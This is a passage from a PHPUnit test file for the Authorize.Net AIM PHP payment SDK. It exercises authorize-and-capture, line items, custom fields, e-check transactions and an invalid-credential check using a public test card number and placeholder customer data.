        $shipping_info->freight = "Freight<|>ground overnight<|>12.95";
        $shipping_info->duty = "Duty1<|>export<|>15.00";
        $shipping_info->tax_exempt = "false";
        $shipping_info->po_num = "12";

        $sale = new AuthorizeNetAIM;
        $sale->setFields($creditCard);
        $sale->setFields($shipping_info);
        $sale->setFields($customer);
        $sale->setFields($order);
        $sale->setFields($merchant);
        $sale->setFields($transaction);

        $sale->addLineItem('item2', 'golf tees', 'titanium tees', '2', '2.95', 'Y');
        $sale->addLineItem('item3', 'golf shirt', 'red, large', '2', '3.95', 'Y');

        $response = $sale->authorizeAndCapture();

        $this->assertTrue($response->approved);
    }

    public function testAllFieldsLongMethod()
    {
        $merchant = (object)array();
        $merchant->login = AUTHORIZENET_API_LOGIN_ID;
        $merchant->tran_key = AUTHORIZENET_TRANSACTION_KEY;
        $merchant->allow_partial_auth = "false";

        $creditCard = array(
            'exp_date' => '02/2020',
            'card_num' => '6011000000000012',
            'card_code' => '452',
            );

        $transaction = array(
        'amount' => rand(100, 1000),
        'duplicate_window' => '10',
        // 'email_customer' => 'true',
        'footer_email_receipt' => 'thank you for your business!',
        'header_email_receipt' => 'a copy of your receipt is below',
        );

        $order = array(
            'description' => 'Johns Bday Gift',
            'invoice_num' => '3123',
            'line_item' => 'item1<|>golf balls<|><|>2<|>18.95<|>Y',
            );

        $customer = (object)array();
        $customer->first_name = "Jane";
        $customer->last_name = "Smith";
        $customer->company = "Jane Smith Enterprises Inc.";
        $customer->address = "20 Main Street";
        $customer->city = "San Francisco";
        $customer->state = "CA";
        $customer->zip = "94110";
        $customer->country = "US";
        $customer->phone = "415-555-5557";
        $customer->fax = "415-555-5556";
        $customer->email = "foo@example.com";
        $customer->cust_id = "55";
        $customer->customer_ip = "98.5.5.5";

        $shipping_info = (object)array();
        $shipping_info->ship_to_first_name = "John";
        $shipping_info->ship_to_last_name = "Smith";
        $shipping_info->ship_to_company = "Smith Enterprises Inc.";
        $shipping_info->ship_to_address = "10 Main Street";
        $shipping_info->ship_to_city = "San Francisco";
        $shipping_info->ship_to_state = "CA";
        $shipping_info->ship_to_zip = "94110";
        $shipping_info->ship_to_country = "US";
        $shipping_info->tax = "CA";
        $shipping_info->freight = "Freight<|>ground overnight<|>12.95";
        $shipping_info->duty = "Duty1<|>export<|>15.00";
        $shipping_info->tax_exempt = "false";
        $shipping_info->po_num = "12";

        $sale = new AuthorizeNetAIM;
        $sale->setFields($creditCard);
        $sale->setFields($shipping_info);
        $sale->setFields($customer);
        $sale->setFields($order);
        $sale->setFields($merchant);
        $sale->setFields($transaction);
        $response = $sale->authorizeAndCapture();

        $this->assertTrue($response->approved);
    }

    public function testResponseMethods()
    {
        $amount = rand(1, 1000);
        $zipcode = "02301";

        $sale = new AuthorizeNetAIM;
        $sale->setFields(
            array(
            'amount' => $amount,
            'card_num' => '6011000000000012',
            'exp_date' => '0420',
            'zip' => $zipcode,
            )
        );

        $sale->setCustomField("custom1", "custom1value");
        $sale->setCustomField("custom2", "custom2value");
        $result = $sale->authorizeAndCapture();
        $this->assertTrue($result->approved);

        $this->assertEquals("custom2value", $result->custom2);
        $this->assertEquals($amount, $result->amount);
        $this->assertEquals("CC", $result->method);
        $this->assertEquals("auth_capture", $result->transaction_type);
        $this->assertEquals("Discover", $result->card_type);
        $this->assertEquals($zipcode, $result->zip_code);
    }

    public function testSetBadField()
    {
        try {
            $amount = rand(1, 1000);
            $zipcode = "02301";

            $sale = new AuthorizeNetAIM;
            $sale->setFields(
                array(
                'amount' => $amount,
                'card_num' => '6011000000000012',
                'exp_date' => '0420',
                'zipcode' => $zipcode, // Should actually be just "zip"
                )
            );

            $result = $sale->authorizeAndCapture();
            $this->assertTrue($result->approved);
            // should have thrown an exception by now
            $this->assertFalse(true);
        }
        catch (AuthorizeNetException $e){
            $this->assertTrue(true);

        }
    }

}


class AuthorizeNetAIM_Live_Test extends PHPUnit_Framework_TestCase
{

    public function testAuthCaptureSetECheckMethod()
    {
        if (MERCHANT_LIVE_API_LOGIN_ID) {
            // $this->markTestIncomplete('Depends on whether eChecks is enabled');
            $sale = new AuthorizeNetAIM(MERCHANT_LIVE_API_LOGIN_ID,MERCHANT_LIVE_TRANSACTION_KEY);
            $sale->setSandbox(false);
            $sale->test_request = 'TRUE';
            $sale->amount = "4.99";
            $sale->setECheck(
                '121042882',
                '123456789123',
                'CHECKING',
                'Bank of Earth',
                'Jane Doe',
                'WEB'
            );
            $response = $sale->authorizeAndCapture();
            $this->assertEquals("ECHECK", $response->method);
            $this->assertEquals("18", $response->response_reason_code);
            // $this->assertTrue($response->approved);
        }
    }

    public function testAuthCaptureECheck()
    {
        if (MERCHANT_LIVE_API_LOGIN_ID) {
            // $this->markTestIncomplete('Depends on whether eChecks is enabled');
            $sale = new AuthorizeNetAIM(MERCHANT_LIVE_API_LOGIN_ID,MERCHANT_LIVE_TRANSACTION_KEY);
            $sale->setSandbox(false);
            $sale->test_request = 'TRUE';
            $sale->setFields(
                array(
                'amount' => rand(1, 1000),
                'method' => 'echeck',
                'bank_aba_code' => '121042882',
                'bank_acct_num' => '123456789123',
                'bank_acct_type' => 'CHECKING',
                'bank_name' => 'Bank of Earth',
                'bank_acct_name' => 'Jane Doe',
                'echeck_type' => 'WEB',
                )
            );
            $response = $sale->authorizeAndCapture();
            $this->assertEquals("ECHECK", $response->method);
            $this->assertEquals("18", $response->response_reason_code);
            // $this->assertTrue($response->approved);
        }
    }

    public function testAuthCaptureLiveServerTestRequest()
    {
        if (MERCHANT_LIVE_API_LOGIN_ID) {
            $sale = new AuthorizeNetAIM(MERCHANT_LIVE_API_LOGIN_ID,MERCHANT_LIVE_TRANSACTION_KEY);
            $sale->setSandbox(false);
            $sale->setFields(
                array(
                'amount' => rand(1, 1000),
                'card_num' => '6011000000000012',
                'exp_date' => '0420'
                )
            );
            $sale->setField('test_request', 'TRUE');
            $response = $sale->authorizeAndCapture();
            $this->assertTrue($response->approved);
        }
    }

    public function testAuthCaptureLiveServer()
    {
        if (MERCHANT_LIVE_API_LOGIN_ID) {
            $sale = new AuthorizeNetAIM(MERCHANT_LIVE_API_LOGIN_ID,MERCHANT_LIVE_TRANSACTION_KEY);
            $sale->setSandbox(false);
            $sale->test_request = 'TRUE';
            $sale->setFields(
                array(
                'amount' => rand(1, 1000),
                'card_num' => '6011000000000012',
                'exp_date' => '0420'
                )
            );
            $response = $sale->authorizeAndCapture();
            $this->assertTrue($response->approved);
        }
    }

    public function testInvalidCredentials()
    {
        if (MERCHANT_LIVE_API_LOGIN_ID) {
            // Post a response to live server using invalid credentials.
            $sale = new AuthorizeNetAIM('a','a');
            $sale->setSandbox(false);
            $sale->setFields(
                array(
                'amount' => rand(1, 1000),
                'card_num' => '6011000000000012',
                'exp_date' => '0420'
                )
            );
            $response = $sale->authorizeAndCapture();
            $this->assertTrue($response->error);
            $this->assertEquals("13", $response->response_reason_code);
        }
    }

}
